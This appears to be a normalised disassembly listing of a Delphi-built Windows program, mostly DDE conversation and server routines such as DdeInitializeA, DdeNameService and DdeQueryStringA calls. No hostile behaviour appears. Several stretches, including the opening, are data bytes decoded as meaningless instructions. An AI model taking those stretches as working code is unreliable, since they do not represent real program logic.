add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x530a0002 ] al
jb r-xdata
add al 0xb0
inc esi
add [ eax ] bl
inc ebp
jb r-xdata
inc ecx
add [ esp + 0x41 ] bl
add [ esp + eax * 2 ] dh
inc ecx
add [ 0xffffffffa4000041 ] dh
inc ecx
add [ ebp + 0x41 ] al
add [ esi ] bh
inc ecx
add [ eax + ebp * 4 + 0x41 ] ch
add [ ebp + 0x41 ] dl
inc eax
add [ edx + esi + 0x40 ] dl
add [ ebp + esi * 4 + 0x45180046 ] al
inc eax
add al ch
xor al 0x40
add ah dh
xor al 0x40
add al bh
xor al 0x40
add ah bh
xor al 0x40
add al dh
xor al 0x40
add [ eax ] bh
xor al [ eax ]
push esp
xor al [ eax ]
nop
xor al [ eax ]
or [ ebp + 0x44 ] eax
inc ebp
jb r-xdata
outsb
push eax
outsd
imul esp [ ebp + 0x44 ] 0x61
je r-xdata
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
push es
add [ edx ] cl
dec edi
jb r-xdata
push 0x180046a8
inc ebp
inc ecx
add [ eax ] ah
inc ebp
inc ecx
add [ esp + eax * 2 ] dh
inc ecx
add [ esi ] cl
add [ eax ] al
jb r-xdata
add [ eax ] al
add [ edx + 0x48004691 ] dl
add [ eax ] al
add [ eax + 0x54004126 ] dh
je r-xdata
add [ ebp + 0x41 ] cl
add [ eax + ebp * 4 + 0x41 ] dh
add [ ebp + esi * 4 + 0x46 ] cl
add [ esi ] cl
add [ eax ] al
add [ eax ] al
add [ ecx ] al
add [ eax ] al
add [ eax + edx + 0x340040 ] dl
add [ eax ] al
or al 0x54
inc esp
push ebx
jb r-xdata
inc ecx
outsd
jb r-xdata
call sub_408dbc
jmp r-xdata
insd
nop
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edx ] dh
xchg edx eax
inc esi
add [ eax + eax ] dl
add [ eax ] al
push esp
sbb al [ ecx ]
call 0xfffffffff446d22d
outsd
outsb
jbe r-xdata
add al dh
xor al 0x40
add [ eax ] bh
xor al [ eax ]
push esp
xor al [ eax ]
insd
nop
loopne r-xdata
inc esi
add [ edi ] al
pop es
push esp
inc esp
dec ebp
jb r-xdata
ror [ eax + edx * 4 + 0x46 ] 0x0
add [ eax ] al
add [ eax ] al
add [ eax + edx * 4 - 0x6f1fffba ] bh
mov ecx [ ebp - 0x4 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b63c
call sub_403a2c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46937d
lea eax [ ebp - 0x18 ]
mov edx 0x2
call sub_404098
lea eax [ ebp - 0x8 ]
mov edx 0x2
call sub_404098
retn
test al 0x41
add ah dh
xor al 0x40
add [ eax - 0x3ffbe5f ] ch
xor al 0x40
push esp
movsb [ edi ] [ esi ]
xchg ecx eax
inc esi
add [ edi ] al
or al 0x54
inc esp
push ebx
jb r-xdata
add ah dh
xor al 0x40
add [ eax - 0x3ffbe5f ] ch
xor al 0x40
add al dh
xor al 0x40
add [ eax ] bh
xor al [ eax ]
push esp
xor al [ eax ]
test [ ebp + 0x45180046 ] dh
inc ecx
inc esi
add [ edi ] al
or al 0x54
inc esp
push ebx
jb r-xdata
add [ eax ] al
add [ ecx ] al
add [ eax ] al
add [ eax + edx + 0x40040 ] dl
add [ eax ] al
or edx [ esp + eax * 2 + 0x64 ]
inc ebx
insb
imul ecx [ ecx + 0x74 ] 0xc08b6d65
inc esp
xchg edx eax
inc esi
add [ edi ] al
or edx [ esp + eax * 2 + 0x64 ]
inc ebx
insb
imul ecx [ ecx + 0x74 ] 0x92146d65
inc esi
add al cl
sbb al [ ecx ]
add [ eax ] eax
push es
inc esp
dec ebp
popad
outsb
add [ eax ] eax
xchg esp eax
adc [ eax ] al
add al 0x0
add bh bh
add [ eax ] al
add [ eax ] al
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
add [ eax ] al
add al 0x49
je r-xdata
jb r-xdata
inc ecx
add [ ebp + 0x41 ] al
add [ esi ] bh
inc ecx
add [ eax + ebp * 4 + 0x41 ] ch
add [ ebp + 0x41 ] dl
add [ ebp + 0x41 ] cl
add [ eax + ebp * 4 + 0x41 ] dh
add al al
scasd [ edi ]
inc esi
add [ esi ] cl
add [ eax ] al
add [ eax ] al
add [ ecx ] al
add [ eax ] al
add [ eax + edx + 0x300040 ] dl
add [ eax ] al
or al 0x54
inc esp
push ebx
jb r-xdata
add [ eax ] al
movsb [ edi ] [ esi ]
jb r-xdata
xor al 0x40
add al bh
xor al 0x40
add ah bh
xor al 0x40
inc ecx
add al ch
xor al 0x40
add ah dh
outsd
outsb
jbe r-xdata
hlt
je r-xdata
add al dh
xor al 0x40
add [ eax ] bh
xor al [ eax ]
push esp
xor al [ eax ]
xchg ecx eax
inc esi
add [ edi + 0x20041 ] ch
push es
inc esp
dec ebp
popad
outsb
add [ eax ] al
lea eax [ eax ]
adc al 0x92
inc esi
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] ah
xchg edx eax
inc esi
add [ edx + edx * 4 + 0x46 ] al
add [ eax ] al
add [ eax ] al
inc ecx
add [ esp + 0x41 ] bl
add [ esp + eax * 2 ] dh
inc ecx
add [ 0xffffffffa4000041 ] dh
insd
mov [ eax + 0x27ac0046 ] ss
inc ecx
add [ edx ] al
add [ esi ] al
inc esp
dec ebp
popad
outsb
add [ eax ] al
lea eax [ eax ]
push eax
xchg ecx eax
inc esi
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax - 0x5bffb96f ] al
xchg ecx eax
inc esi
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
sub_469284
push ebp
mov ebp esp
xor ecx ecx
push ecx
push ecx
push ecx
push ecx
push ecx
push ecx
push ebx
xor edx edx
push ebp
push sub_469376
push [ fs : edx ]
mov [ fs : edx ] esp
test al al
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46937d
lea eax [ ebp - 0x18 ]
mov edx 0x2
call sub_404098
lea eax [ ebp - 0x8 ]
mov edx 0x2
call sub_404098
retn
mov eax [ rw-data ]
mov eax [ eax + 0x44 ]
push eax
call DdeGetLastError
mov ebx eax
mov eax ebx
add eax 0xffffbff9
sub eax 0x2
jb r-xdata
lea eax [ ebp - 0x4 ]
push eax
lea edx [ ebp - 0x8 ]
mov eax [ rw-data ]
call sub_405ba4
mov eax [ ebp - 0x8 ]
mov [ ebp - 0x10 ] ebx
mov [ ebp - 0xc ] 0x0
lea edx [ ebp - 0x10 ]
xor ecx ecx
call sub_408dbc
jmp r-xdata
dec eax
je r-xdata
mov ecx [ ebp - 0x4 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b63c
call sub_403a2c
lea eax [ ebp - 0x4 ]
push eax
lea edx [ ebp - 0x14 ]
mov eax [ rw-data ]
call sub_405ba4
mov eax [ ebp - 0x14 ]
mov [ ebp - 0x10 ] ebx
mov [ ebp - 0xc ] 0x0
lea edx [ ebp - 0x10 ]
xor ecx ecx
call sub_408dbc
jmp r-xdata
jmp r-xdata
lea eax [ ebp - 0x4 ]
push eax
lea edx [ ebp - 0x18 ]
mov eax [ rw-data ]
call sub_405ba4
mov eax [ ebp - 0x18 ]
mov [ ebp - 0x10 ] ebx
mov [ ebp - 0xc ] 0x0
lea edx [ ebp - 0x10 ]
xor ecx ecx
call sub_408dbc
sub_469384
push ebp
mov ebp esp
add esp 0xffffff9c
push ebx
push esi
push edi
mov ebx [ ebp + 0x10 ]
mov esi [ ebp + 0x8 ]
xor edi edi
mov eax esi
sub eax 0x1062
je r-xdata
mov ecx [ ebp + 0x14 ]
mov edx [ ebp + 0x18 ]
mov eax [ rw-data ]
call sub_46972c
mov edi eax
and edi 0x7f
jmp r-xdata
sub eax 0x1080
je r-xdata
test ebx ebx
je r-xdata
mov ecx [ ebp + 0x14 ]
mov edx [ ebp + 0x18 ]
mov eax [ rw-data ]
call sub_4697e0
mov edi eax
jmp r-xdata
sub eax 0x5f90
je r-xdata
mov eax edi
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x20
mov [ ebp - 0x64 ] 0x60
cmp esi 0x8080
jne r-xdata
mov eax [ ebp + 0x24 ]
push eax
mov ecx [ ebp + 0x14 ]
mov edx ebx
mov eax [ rw-data ]
call sub_469844
jmp r-xdata
mov [ ebp - 0x4 ] 0xffffffff
mov eax [ ebp + 0x20 ]
mov [ ebp - 0x4 ] eax
jmp r-xdata
cmp esi 0x4050
jg r-xdata
lea eax [ ebp - 0x64 ]
push eax
mov eax [ ebp - 0x4 ]
push eax
push ebx
call DdeQueryConvInfo
test eax eax
je r-xdata
sub esi 0x4090
je r-xdata
je r-xdata
mov esi [ ebp - 0x60 ]
mov eax [ ebp + 0x18 ]
push eax
mov eax [ ebp + 0x1c ]
push eax
mov eax [ ebp + 0xc ]
push eax
mov ecx [ ebp + 0x14 ]
mov edx ebx
mov eax esi
call sub_46b1ec
mov edi eax
jmp r-xdata
sub esi 0x3fb0
je r-xdata
mov esi [ ebp - 0x60 ]
mov eax [ ebp + 0x1c ]
push eax
mov ecx [ ebp + 0x14 ]
mov edx ebx
mov eax esi
call sub_46b2a0
mov edi eax
jmp r-xdata
sub esi 0x1030
je r-xdata
mov esi [ ebp - 0x60 ]
mov eax [ ebp + 0x18 ]
push eax
mov ecx [ ebp + 0x14 ]
mov edx ebx
mov eax esi
call sub_46b1bc
jmp r-xdata
sub esi 0x40
je r-xdata
mov esi [ ebp - 0x60 ]
mov eax [ ebp + 0x18 ]
push eax
mov ax [ ebp + 0xc ]
push eax
mov ecx [ ebp + 0x14 ]
mov edx ebx
mov eax esi
call sub_46b088
mov edi eax
and edi 0x7f
jmp r-xdata
sub esi 0xff2
je r-xdata
mov eax [ ebp - 0x60 ]
test eax eax
je r-xdata
sub esi 0x42
je r-xdata
mov esi [ ebp - 0x60 ]
mov eax [ ebp + 0x18 ]
push eax
mov ax [ ebp + 0xc ]
push eax
mov ecx [ ebp + 0x14 ]
mov edx ebx
mov eax esi
call sub_46b2c0
mov edi eax
jmp r-xdata
sub esi 0x8e
je r-xdata
call sub_46a42c
jmp r-xdata
mov ebx [ ebp - 0x60 ]
test ebx ebx
je r-xdata
jmp r-xdata
mov esi [ ebp - 0x60 ]
mov eax [ ebp + 0x18 ]
push eax
mov ax [ ebp + 0xc ]
push eax
mov ecx [ ebp + 0x14 ]
mov edx ebx
mov eax esi
call sub_46b2c0
mov edi eax
jmp r-xdata
sub esi 0x1f60
je r-xdata
mov eax ebx
mov edx [ r-xdata ]
call sub_40342c
test al al
je r-xdata
mov eax [ ebp - 0x60 ]
mov ecx [ ebp + 0x18 ]
mov edx [ ebp + 0x1c ]
call sub_46a478
jmp r-xdata
jmp r-xdata
mov edx ebx
mov eax [ rw-data ]
call sub_469928
mov eax ebx
call sub_46a434
jmp r-xdata
sub_469594
push ebp
mov ebp esp
push 0x0
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor eax eax
push ebp
push sub_469648
push [ fs : eax ]
mov [ fs : eax ] esp
xor edx edx
mov eax esi
call sub_41a0e4
push r-xdata
call RegisterClipboardFormatA
mov [ esi + 0x48 ] ax
xor eax eax
mov [ esi + 0x44 ] eax
push 0x0
push 0x0
push sub_469384
lea eax [ esi + 0x44 ]
push eax
call DdeInitializeA
test eax eax
sete al
call sub_469284
mov dl 0x1
mov eax [ r-xdata ]
call sub_403270
mov [ esi + 0x38 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_403270
mov [ esi + 0x3c ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_403270
mov [ esi + 0x40 ] eax
lea edx [ ebp - 0x4 ]
xor eax eax
call sub_4029f4
mov edx [ ebp - 0x4 ]
mov eax esi
call sub_469970
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46964f
lea eax [ ebp - 0x4 ]
call sub_404074
retn
add esp 0xfffffff0
call sub_4035c4
sub_469671
add [ eax ] al
add [ ebx + 0x56 ] dl
push edi
push ebp
call sub_40362c
mov ebx edx
mov ebp eax
mov eax [ ebp + 0x38 ]
test eax eax
je r-xdata
mov eax [ ebp + 0x3c ]
test eax eax
je r-xdata
mov esi [ eax + 0x8 ]
dec esi
test esi esi
jl r-xdata
mov eax [ ebp + 0x40 ]
test eax eax
je r-xdata
mov esi [ eax + 0x8 ]
dec esi
test esi esi
jl r-xdata
mov eax [ ebp + 0x38 ]
call sub_4032a0
xor eax eax
mov [ ebp + 0x38 ] eax
inc esi
xor edi edi
mov eax ebp
call sub_469a24
mov eax [ ebp + 0x44 ]
push eax
call DdeUninitialize
xor eax eax
mov [ rw-data ] eax
mov edx ebx
and dl 0xfc
mov eax ebp
call sub_41a130
test bl bl
jle r-xdata
call sub_4032a0
xor eax eax
mov [ ebp + 0x40 ] eax
mov eax [ ebp + 0x3c ]
call sub_4032a0
xor eax eax
mov [ ebp + 0x3c ] eax
inc esi
xor edi edi
mov eax [ ebp + 0x38 ]
mov edx edi
call sub_413de4
call sub_4032a0
inc edi
dec esi
jne r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax ebp
call sub_403614
mov eax [ ebp + 0x3c ]
mov edx edi
call sub_413de4
call sub_4032a0
inc edi
dec esi
jne r-xdata
sub_46972c
push ebp
mov ebp esp
add esp 0xfffff004
push eax
add esp 0xfffffff8
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0x8 ] ebx
mov [ ebp - 0x4 ] ecx
mov esi edx
mov edi eax
xor eax eax
push ebp
push sub_4697d0
push [ fs : eax ]
mov [ fs : eax ] esp
xor ebx ebx
test esi esi
je r-xdata
push 0x3ec
push 0x1000
lea eax [ ebp - 0x1008 ]
push eax
mov eax [ ebp - 0x4 ]
push eax
mov eax [ edi + 0x44 ]
push eax
call DdeQueryStringA
mov ecx eax
lea edx [ ebp - 0x1008 ]
lea eax [ ebp - 0x8 ]
call sub_404164
mov edx [ ebp - 0x8 ]
mov eax edi
call sub_469a50
test eax eax
je r-xdata
mov eax [ edi + 0x34 ]
push eax
push esi
call DdeCmpStringHandles
test eax eax
jne r-xdata
mov edx [ ebp - 0x8 ]
mov eax edi
call sub_469aa0
test eax eax
je r-xdata
mov bl 0x1
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4697d7
lea eax [ ebp - 0x8 ]
call sub_404074
retn
mov bl 0x1
sub_4697e0
push ebx
push esi
push edi
push ebp
add esp 0xfffffff0
mov esi ecx
mov ebp edx
mov ebx eax
xor edi edi
test esi esi
je r-xdata
mov eax edi
add esp 0x10
pop ebp
pop edi
pop esi
pop ebx
retn
mov ecx esi
mov edx ebp
mov eax ebx
call sub_46972c
cmp al 0x1
jne r-xdata
mov eax [ ebx + 0x34 ]
mov [ esp ] eax
mov [ esp + 0x4 ] esi
xor eax eax
mov [ esp + 0x8 ] eax
xor eax eax
mov [ esp + 0xc ] eax
push 0x0
push 0x1
push 0x0
push 0x0
push 0x10
lea eax [ esp + 0x14 ]
push eax
mov eax [ rw-data ]
mov eax [ eax + 0x44 ]
push eax
call DdeCreateDataHandle
mov edi eax
sub_469844
push ebp
mov ebp esp
add esp 0xfffff004
push eax
add esp 0xfffffff8
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0x8 ] ebx
mov [ ebp - 0x4 ] ecx
mov edi edx
mov esi eax
xor eax eax
push ebp
push sub_469915
push [ fs : eax ]
mov [ fs : eax ] esp
mov ecx esi
mov dl 0x1
mov eax [ r-xdata ]
call sub_46afc0
mov ebx eax
push 0x3ec
push 0x1000
lea eax [ ebp - 0x1008 ]
push eax
mov eax [ ebp - 0x4 ]
push eax
mov eax [ esi + 0x44 ]
push eax
call DdeQueryStringA
mov ecx eax
lea edx [ ebp - 0x1008 ]
lea eax [ ebp - 0x8 ]
call sub_404164
lea eax [ ebx + 0x30 ]
mov edx [ ebp - 0x8 ]
call sub_4040c8
mov edx [ ebp - 0x8 ]
mov eax esi
call sub_469a50
mov [ ebx + 0x3c ] eax
cmp [ ebx + 0x3c ] 0x0
jne r-xdata
mov [ ebx + 0x40 ] edi
push ebx
push 0xffffffff
push edi
call DdeSetUserHandle
mov edx ebx
mov eax [ esi + 0x38 ]
call sub_413c88
mov eax [ ebx + 0x3c ]
test eax eax
je r-xdata
mov edx [ ebp - 0x8 ]
mov eax esi
call sub_469aa0
mov [ ebx + 0x38 ] eax
mov bl 0x1
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46991c
lea eax [ ebp - 0x8 ]
call sub_404074
retn
mov si 0xffef
call sub_40349c
sub_469928
push ebx
push esi
push edi
mov edi eax
mov ebx edx
mov eax [ ebx + 0x3c ]
test eax eax
je r-xdata
mov eax [ ebx + 0x40 ]
test eax eax
je r-xdata
mov si 0xffee
call sub_40349c
xor eax eax
mov [ ebx + 0x40 ] eax
mov eax [ edi + 0x38 ]
test eax eax
je r-xdata
push 0x0
push 0xffffffff
push eax
call DdeSetUserHandle
pop edi
pop esi
pop ebx
retn
mov edx ebx
call sub_413f80
mov eax ebx
call sub_4032a0
sub_469970
push ebp
mov ebp esp
push 0x0
push ebx
push esi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_469a0c
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
call sub_469a24
lea edx [ ebp - 0x4 ]
mov eax esi
call sub_4085c4
mov edx [ ebp - 0x4 ]
lea eax [ ebx + 0x30 ]
call sub_4040c8
mov edx [ ebx + 0x30 ]
mov eax r-xdata
call sub_404678
mov esi eax
test esi esi
je r-xdata
push 0x3ec
mov eax [ ebx + 0x30 ]
call sub_404534
push eax
mov eax [ ebx + 0x44 ]
push eax
call DdeCreateStringHandleA
mov esi eax
mov [ ebx + 0x34 ] esi
push 0x1
push 0x0
push esi
mov eax [ ebx + 0x44 ]
push eax
call DdeNameService
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_469a13
lea eax [ ebp - 0x4 ]
call sub_404074
retn
mov eax [ ebx + 0x30 ]
call sub_404334
mov ecx eax
lea eax [ ebx + 0x30 ]
mov edx esi
call sub_4045d4
sub_469a24
push ebx
mov ebx eax
mov eax [ ebx + 0x34 ]
test eax eax
je r-xdata
xor eax eax
mov [ ebx + 0x34 ] eax
pop ebx
retn
push 0x2
push 0x0
push eax
mov eax [ ebx + 0x44 ]
push eax
call DdeNameService
mov eax [ ebx + 0x34 ]
push eax
mov eax [ ebx + 0x44 ]
push eax
call DdeFreeStringHandle
sub_469a50
push ebx
push esi
push edi
push ebp
add esp 0xfffffff8
mov [ esp ] edx
mov ebp eax
xor eax eax
mov [ esp + 0x4 ] eax
mov eax [ ebp + 0x40 ]
mov esi [ eax + 0x8 ]
dec esi
test esi esi
jl r-xdata
mov eax [ esp + 0x4 ]
pop ecx
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
inc esi
xor edi edi
inc edi
dec esi
jne r-xdata
mov [ esp + 0x4 ] ebx
jmp r-xdata
mov eax [ ebp + 0x40 ]
mov edx edi
call sub_413de4
mov ebx eax
mov edx [ esp ]
mov eax [ ebx + 0x8 ]
call sub_407edc
test eax eax
jne r-xdata
sub_469aa0
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x4 ] edx
xor eax eax
push ebp
push sub_469b22
push [ fs : eax ]
mov [ fs : eax ] esp
xor eax eax
mov [ ebp - 0x8 ] eax
mov eax [ rw-data ]
mov eax [ eax ]
call sub_45bad8
mov esi eax
dec esi
test esi esi
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_469b29
lea eax [ ebp - 0xc ]
call sub_404074
retn
inc esi
xor edi edi
inc edi
dec esi
jne r-xdata
mov [ ebp - 0x8 ] ebx
jmp r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
mov edx edi
call sub_45bac4
mov ebx eax
lea edx [ ebp - 0xc ]
mov eax ebx
call sub_43ddf8
mov eax [ ebp - 0xc ]
mov edx [ ebp - 0x4 ]
call sub_407edc
test eax eax
jne r-xdata
sub_469b34
push ebx
push esi
push edi
push ebp
add esp 0xfffffff8
mov [ esp ] edx
mov ebp eax
xor eax eax
mov [ esp + 0x4 ] eax
mov eax [ ebp + 0x38 ]
mov esi [ eax + 0x8 ]
dec esi
test esi esi
jl r-xdata
mov eax [ esp + 0x4 ]
pop ecx
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
inc esi
xor edi edi
inc edi
dec esi
jne r-xdata
mov [ esp + 0x4 ] ebx
jmp r-xdata
mov eax [ ebp + 0x38 ]
mov edx edi
call sub_413de4
mov ebx eax
mov edx [ esp ]
mov eax [ ebx + 0x30 ]
call sub_407edc
test eax eax
jne r-xdata
sub_469b84
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov [ ebp - 0x4 ] ecx
mov esi edx
mov ebx eax
mov eax [ ebp - 0x4 ]
call sub_404524
xor eax eax
push ebp
push sub_469bdb
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx esi
mov eax ebx
call sub_469b34
test eax eax
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_469be2
lea eax [ ebp - 0x4 ]
call sub_404074
retn
mov edx [ ebp - 0x4 ]
call sub_46b4a8
test eax eax
je r-xdata
call sub_46b68c
sub_469c08
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_41a0e4
mov dl 0x1
mov eax [ r-xdata ]
call sub_403270
mov [ esi + 0x9c ] eax
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_4035c4
mov eax esi
pop esi
pop ebx
retn
call sub_40361c
pop [ fs : 0x0 ]
add esp 0xc
sub_469c50
push ebx
push esi
call sub_40362c
mov ebx edx
mov esi eax
mov eax esi
call sub_46a294
mov edx ebx
and dl 0xfc
mov eax esi
call sub_41a130
mov eax [ esi + 0x9c ]
call sub_4032a0
xor eax eax
mov [ esi + 0x9c ] eax
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_403614
sub_469c90
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_41a45c
push ebx
push sub_469d60
push ebx
push r-xdata
cmp [ ebx + 0x30 ] 0x0
jne r-xdata
mov cl 0x1
cmp [ ebx + 0x34 ] 0x0
jne r-xdata
xor ecx ecx
jmp r-xdata
mov edx r-xdata
mov eax esi
mov ebx [ eax ]
call [ ebx + 0x4 ]
pop esi
pop ebx
retn
sub_469cdd
add [ eax ] al
add [ ebp - 0x75 ] dl
in al dx
push 0x0
push 0x0
push ebx
mov ebx eax
xor eax eax
push ebp
push sub_469d54
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
call sub_41a534
lea eax [ ebp - 0x4 ]
mov edx [ ebx + 0x30 ]
call sub_40410c
lea eax [ ebp - 0x8 ]
mov edx [ ebx + 0x34 ]
call sub_40410c
mov eax [ ebp - 0x4 ]
call sub_404334
test eax eax
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_469d5b
cmp [ ebx + 0xc5 ] 0x1
je r-xdata
push 0x0
mov ecx [ ebp - 0x8 ]
mov edx [ ebp - 0x4 ]
mov eax ebx
call sub_46a050
sub_469d60
push ebp
mov ebp esp
push 0x0
push 0x0
push ebx
push esi
push edi
mov esi edx
mov edi eax
xor eax eax
push ebp
push sub_469e0b
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax esi
call sub_41806c
jmp r-xdata
mov eax esi
call sub_417108
test al al
je r-xdata
lea edx [ ebp - 0x4 ]
mov eax esi
call sub_418d0c
mov edx [ ebp - 0x4 ]
mov eax r-xdata
call sub_404678
mov ebx eax
lea eax [ ebp - 0x8 ]
push eax
mov eax [ ebp - 0x4 ]
call sub_404334
mov ecx eax
sub ecx ebx
lea edx [ ebx + 0x1 ]
mov eax [ ebp - 0x4 ]
call sub_404594
mov eax [ ebp - 0x4 ]
mov al [ eax ]
sub al 0x53
je r-xdata
mov eax esi
call sub_418074
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_469e12
lea eax [ ebp - 0x8 ]
mov edx 0x2
call sub_404098
retn
mov edx [ ebp - 0x8 ]
mov eax edi
call sub_46a538
jmp r-xdata
dec al
je r-xdata
mov edx [ ebp - 0x8 ]
mov eax edi
call sub_46a54c
jmp r-xdata
sub_469e1f
inc [ ecx ]
add [ eax ] al
add [ eax ] ah
add [ eax ] al
add [ ebp - 0x75 ] dl
in al dx
xor ecx ecx
push ecx
push ecx
push ecx
push ecx
push ecx
push ebx
push esi
mov ebx edx
mov esi eax
xor eax eax
push ebp
push sub_469edb
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
call sub_4198b8
lea eax [ ebp - 0x4 ]
mov edx [ esi + 0x30 ]
call sub_40410c
lea eax [ ebp - 0x8 ]
push eax
mov eax [ ebp - 0x4 ]
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] 0xb
lea edx [ ebp - 0x10 ]
xor ecx ecx
mov eax r-xdata
call sub_408dbc
mov edx [ ebp - 0x8 ]
mov eax ebx
call sub_419960
lea eax [ ebp - 0x4 ]
mov edx [ esi + 0x34 ]
call sub_40410c
lea eax [ ebp - 0x14 ]
push eax
mov eax [ ebp - 0x4 ]
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] 0xb
lea edx [ ebp - 0x10 ]
xor ecx ecx
mov eax r-xdata
call sub_408dbc
mov edx [ ebp - 0x14 ]
mov eax ebx
call sub_419960
mov eax ebx
call sub_4198c0
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_469ee2
lea eax [ ebp - 0x14 ]
call sub_404074
lea eax [ ebp - 0x8 ]
mov edx 0x2
call sub_404098
retn
sub_469f10
push ebx
push esi
push edi
mov edi edx
mov ebx eax
mov ecx ebx
mov dl 0x1
mov eax [ r-xdata ]
call sub_46a824
mov esi eax
mov eax [ ebx + 0x9c ]
mov edx [ eax + 0x8 ]
mov ecx esi
call sub_413e60
mov [ esi + 0x10 ] edi
xor edx edx
mov eax esi
call sub_46a894
pop edi
pop esi
pop ebx
retn
sub_469f48
push ebx
push esi
mov ebx edx
mov esi eax
mov edx ebx
mov eax esi
call sub_46a008
mov ebx eax
test ebx ebx
je r-xdata
pop esi
pop ebx
retn
xor edx edx
mov eax ebx
call sub_46a894
mov edx ebx
mov eax [ esi + 0x9c ]
call sub_413f80
mov eax ebx
call sub_4032a0
sub_469f80
push ebx
push esi
push edi
push ebp
push ecx
mov ebp ecx
mov edi edx
mov esi eax
mov [ esp ] 0x1
mov edx edi
mov eax esi
call sub_46a008
mov ebx eax
test ebx ebx
jne r-xdata
test ebx ebx
je r-xdata
mov eax ebp
call sub_404334
test eax eax
jle r-xdata
test ebx ebx
je r-xdata
mov eax ebp
call sub_404334
test eax eax
jne r-xdata
mov edx edi
mov eax esi
call sub_469f10
mov edx edi
mov eax esi
call sub_46a008
mov ebx eax
mov al [ esp ]
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
mov edx ebp
mov eax ebx
call sub_46a894
mov [ esp ] al
cmp [ esp ] 0x0
jne r-xdata
mov edx edi
mov eax esi
call sub_469f48
jmp r-xdata
test [ esi + 0x1c ] 0x1
jne r-xdata
mov edx edi
mov eax esi
call sub_469f48
sub_46a008
push ebx
push esi
push edi
push ebp
add esp 0xfffffff8
mov [ esp ] edx
mov esi eax
xor eax eax
mov [ esp + 0x4 ] eax
xor ebx ebx
jmp r-xdata
movzx ebp bx
mov edi [ esi + 0x9c ]
cmp ebp [ edi + 0x8 ]
jl r-xdata
mov edx ebp
mov eax edi
call sub_413de4
mov edx [ eax + 0x10 ]
cmp edx [ esp ]
jne r-xdata
mov eax [ esp + 0x4 ]
pop ecx
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
inc ebx
mov [ esp + 0x4 ] eax
jmp r-xdata
sub_46a050
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi ecx
mov ebx edx
mov esi eax
mov eax esi
call sub_46a294
mov edx ebx
mov eax esi
call sub_46a538
mov edx edi
mov eax esi
call sub_46a54c
mov eax esi
call sub_46a0a0
mov ebx eax
test bl bl
jne r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
pop ebp
retn 0x4
xor edx edx
mov eax esi
call sub_46a538
xor edx edx
mov eax esi
call sub_46a54c
sub_46a0a0
push ebp
mov ebp esp
add esp 0xfffffef8
push ebx
push esi
push edi
xor edx edx
mov [ ebp - 0x108 ] edx
mov edi eax
xor eax eax
push ebp
push sub_46a276
push [ fs : eax ]
mov [ fs : eax ] esp
mov [ ebp - 0x1 ] 0x0
cmp [ edi + 0x38 ] 0x0
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46a27d
lea eax [ ebp - 0x108 ]
call sub_404074
retn
mov eax [ edi + 0x30 ]
call sub_404334
test eax eax
jne r-xdata
cmp [ edi + 0xa0 ] 0x0
jne r-xdata
mov eax [ edi + 0x34 ]
call sub_404334
test eax eax
jne r-xdata
cmp [ edi + 0xa4 ] 0x0
jne r-xdata
lea eax [ ebp - 0x101 ]
mov edx [ edi + 0x30 ]
call sub_40878c
push 0x3ec
lea eax [ ebp - 0x101 ]
push eax
mov eax [ rw-data ]
